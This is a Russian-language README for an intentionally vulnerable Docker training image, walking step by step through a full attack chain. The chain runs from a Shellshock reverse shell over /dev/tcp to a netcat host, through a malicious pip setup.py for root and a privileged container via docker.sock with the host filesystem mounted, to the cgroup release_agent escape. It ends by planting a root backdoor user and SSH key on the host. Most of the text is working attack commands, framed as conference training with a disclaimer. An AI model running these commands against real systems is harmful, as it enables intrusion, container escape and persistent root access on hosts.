
# Pentest Docker Step-By-Step

Специально подготовленный образ для конференции Archdays 2020, позволяющий попрактиковать навыки тестирования на проникновение приложения внутри Docker-контейнера. Образ содержит в себе пакет уязвимый (CVE-2014-6271) Bash, позволяющий реализовать Remote Code Execution. Уязвимость более известна как Shellshock. За основу взят образ [opsxcq](https://github.com/opsxcq/exploit-CVE-2014-6271).

Эксплуатация уявзимости состоит из следующих этапов:
- Получение доступа в shell контейнера под пользователем www-data, используя RCE (Shellshock)
- Повышение привилегий до root через FakePip exploit
- Подключение к docker.sock и разворачивание нового контейнера ubuntu с сервисом SSH для дальнейшего подключения (с маунтом ```/:/host``` и максимальными привилегиями)
- Создание пользователя hidle на хосте
- Подключение к хосту с новым пользователем
- Разворачивание Weave Scope

Данный образ может также быть объектом тестирования для пилотирования решений по Container Security. Пакет bash может быть обнаружен trivy, а выход за пределы контейнера с помощью Falco. 

![Pentest-In-Docker-Demo](https://github.com/Swordfish-Security/Pentest-In-Docker/blob/master/2020-11-17-124306.gif)

## Установка уязвимого окружения

Чтобы собрать уязвимый образ контейнера

    docker build . -t  vuln-wheezy
   
или
    
    docker pull dvyakimov/vuln-wheezy

Для реализации сцераия необходимо развернуть приложение с подключением docker.sock:

    docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it -p 8080:80 vuln-wheezy:latest

Вы можете проверить доступность версиса по адресу ```localhost:8080```

## Exploit

### Эксплуатация Shellshock

Запускаем на машине, к которой мы будем подключаться через reverse-shell netcat:

    nc -l 1337

В новом окне эксплуатируем RCE с заменой ```<IP-netcat>```, на котором запущен netcat,```<IP-target>``` на тот, где у вас запущен уязвимый сервис:

    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'sh -i >& /dev/tcp/<IP-netcat>/1337 0>&1'" http://<IP-target>/cgi-bin/vulnerable
    
## Изучение внутри контейнера

    # информация об ОС внутри контейнера
    cat /etc/os-release
    
    # информация о ядре. На основе этой информации можно начать искать CVE.  
    uname -rv
    uname -a
    
    # пользователь под которым провалились в контейнер
    id

    # просмотр текущих cgroups
    cat /proc/1/cgroup

    # просотр доступных переменных
    env

    # сеть
    ifconfig

    # cмотрим какие mounts были сделаны внутрь контейнера
    cat /proc/mounts

    # смотрим есть ли docker.sock
    cat /proc/mounts | grep docker.sock

    # просмотр прав на docker.sock
    ls -l /var/run/docker.sock
    
Видим, что есть возможность выполнять установку пакетов pip от sudo:

    sudo -l
    
## Повышение привилегий внутри контейнера

Скачиваем exploit для pip в /tmp:

    cd /tmp && wget https://raw.githubusercontent.com/dvyakimov/FakePip/master/setup.py

Меняем ```<IP-netcat>```  на тот IP-адрес, где у вас будет запущен еще один netcat:

    cat setup.py | sed "s/192.168.168.2/<IP-netcat>/" > setup-new.py && mv setup-new.py setup.py

Открываем в другом терминале, формируя новое подключение

    nc -l 13372

Устанавливаем exploit через pip

    sudo pip install . --upgrade --force-reinstall

Получаем root внутри контейнера

## Смена контейнера

Теперь, когда есть root, доустанавливаем то, что нам может понадобиться. Например, capsh, чтобы узнать Capabilities:

    apt-get update && \
    apt-get install libcap2-bin

Узнаем Capabilities:

    grep Cap /proc/self/status
    capsh --decode=00000000a80425fb   # default запуск
    # capsh --decode=00000000a82425fb если добавили sys_admin
    # capsh --decode=0000003fffffffff есть контейнер priviliged 

Здесь можно было бы поставить jq и создать контейнер через подключение по curl в docker.sock, но к сожалению на debian 7 curl настолько старый, что подключение к unix-сокету не поддерживается. Пойдем по пути подключения через netcat. Примеров в Интернете подключения через netcat немного, поэтому разбираемся самостоятельно.
Установить пакет, чтобы netcat работал с unix-socket

    apt-get install netcat netcat-openbsd

Теперь можем отправлять запросы в unix-socket:

    echo -e "GET /images/json HTTP/1.0\r\n" | nc -U /var/run/docker.sock

Скачиваем необходимый образ. Пусть это будет образ ubuntu с сервисом ssh:

    nc -U /var/run/docker.sock
    POST /v1.39/images/create?fromImage=rastasheep/ubuntu-sshd&tag=14.04 HTTP/1.0

Создадим новый контейнер ubuntu через docker.sock. Важный момент, что здесь мы маунтим в папку /host всю директорию root хоста:

    request="POST /v1.39/containers/create HTTP/1.0\r\nContent-Type: application/json\r\nContent-Length: 12345\r\n\r\n{\"Image\":\"rastasheep/ubuntu-sshd:14.04\",
    \"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host\", \"/dev/log:/dev/log\"]}}" && echo -e $request | nc -U /var/run/docker.sock

 На выходе будет id. Запускаем контейнер (заменяем ```<id>``` на полученный выше:

    request="POST /v1.39/containers/<id>/start HTTP/1.0\r\n\r\n" && echo -e $request | nc -U /var/run/docker.sock
    
Проверим новый контейнер. Здесь же можно увидеть IP адрес в поле ```"IPAddress"```:
    
    echo -e "GET /images/json HTTP/1.0\r\n" | nc -U /var/run/docker.sock

Подключаемся к соданному нами контейнеру пароль ```root```:

    ssh root@172.17.0.2

## Выход за пределы контейнера

Так как контейнер стал привилигрованный, то можно получить список процессов хоста.
Увидеть список процессов на хосте за счет лишних capabilities (чтобы это получилось, вставлять команды нужно step-by-step):

    d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)` \
    mkdir -p $d/w \
    echo 1 >$d/w/notify_on_release \
    t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab` \
    touch /o \
    echo $t/c >$d/release_agent \
    printf '#!/bin/sh\nps >'"$t/o" >/c \
    chmod +x /c \
    sh -c "echo 0 >$d/w/cgroup.procs" \
    sleep 1 \
    cat /o

Подключившись на новый контейнер, создаем пользователя ```hidle``` на хосте.
Добавляем в /host/etc/passwd:

    echo 'hidle:x:0:0:Hidle,,,:/home/hidle:/bin/bash' >> /host/etc/passwd

Добавляем в /host/etc/shadow -пароль ```666106610```:

    echo 'hidle:$6$rU8Vq2aztTvx6FT8$WNeoWmMGe3CGEXYid6c2oUqy1rXuo2nLpyQpywECLM5FlUZo7hp6TBPZyHeDMohPamrDKprK5C5zO3gbEYrc20:18582:0:99999:7:::' >> /host/etc/shadow

Добавляем в /host/etc/group:

    echo 'hidle:x:0:' >> /host/etc/group

Добавляем в /host/etc/gshadow:

    echo 'hidle:!::' >> /host/etc/gshadow

Также создаем себе директорию:

    mkdir /host/home/hidle

Правда подключиться к хосту может не получиться в случае, если на хосте установлен запрет входа по паролю. В таком случае:

    mkdir /host/home/hidle/.ssh

Генерируем пару ключей:

    ssh-keygen

Кладем публичный ключ на хост:

    cat  /root/.ssh/id_rsa.pub >> /host/home/hidle/.ssh/authorized_keys

Теперь подключаемся на хост с помощью созданного пользователя:

    ssh hidle@172.17.0.1

Мы подключились к хосту став root несмотря на то, что мы не знаем пароль от root.
## Выполнение команд на хосте

Оказавшись на хосте  можно сказать, что игра закончена, но мы можем сделать еще кое-что:

    sudo curl -L git.io/scope -o /usr/local/bin/scope
    sudo chmod a+x /usr/local/bin/scope
    scope launch

На том же IP адресе, на который мы подключались с RCE,  появился новый сервис по 4040 порту. Если перейти на новый сервис через браузер, можно увидеть информацию обо всех имеющихся контейнерах, информацию о RAM/CPU, вплоть до возможности подключиться к любому сервису через терминал.


[Здесь](https://www.intezer.com/blog/cloud-workload-protection/attackers-abusing-legitimate-cloud-monitoring-tools-to-conduct-cyber-attacks/) вы можете прочитать про реальные атаки через Weave Scope.

### Дисклеймер

Все, что продемонстрировано здесь используется для учебных целей. Не пытайтесь повторить без соответствующих прав на сторонних организациях. Swordfish Security не несет ответственность за любой причиненный вред в следствии прямого или косвенного использования данной инструкции и соответствующего ПО. 
